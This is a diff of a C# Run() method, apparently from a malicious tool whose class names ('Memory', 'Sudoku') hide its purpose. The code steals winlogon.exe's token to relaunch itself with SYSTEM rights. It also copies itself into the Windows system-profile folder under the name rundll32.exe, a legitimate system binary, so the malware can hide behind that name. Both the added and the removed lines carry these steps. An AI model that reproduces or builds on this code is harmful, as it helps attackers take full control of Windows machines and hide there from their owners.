@@ -22,30 +22,22 @@ namespace Memory
 
         public static void Run()
         {
-            // TODO Code is a mess, will clean soon
-            // First run: Gains system
-            // Second run: Creates copy in system profile directory
-            // Third run: Runs from system profile directory
-
+            if (Environment.UserName.ToLower() is "system" or @"anon$") return;
             Process process = Process.GetCurrentProcess();
-            if (process.MainModule == null) return;
-            string currentPath = process.MainModule.FileName;
-            const string finalPath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
-            if (currentPath == finalPath) return; // Third run return
-            if (Environment.UserName.ToLower() is not "system" and not @"anon$")
+            if (process.MainModule != null)
             {
+                string currentPath = process.MainModule.FileName;
+                const string finalPath = @"C:\Windows\System32\config\systemprofile\rundll32.exe";
+                if (File.Exists(finalPath)) File.Delete(finalPath);
+                if (currentPath != null) File.Copy(currentPath, finalPath);
                 Sudoku.RunWithTokenOf(
                     "winlogon.exe",
                     true,
-                    process.MainModule.FileName,
+                    finalPath,
                     string.Empty,
                     RuntimeEnvironment.GetRuntimeDirectory());
-                Environment.Exit(0); // First run exit
             }
-            if (File.Exists(finalPath)) File.Delete(finalPath);
-            if (currentPath != null) File.Copy(currentPath, finalPath);
-            Process.Start(finalPath);
-            Environment.Exit(0); // Second run exit
+            Environment.Exit(0);
         }
 
         public static void Clean()
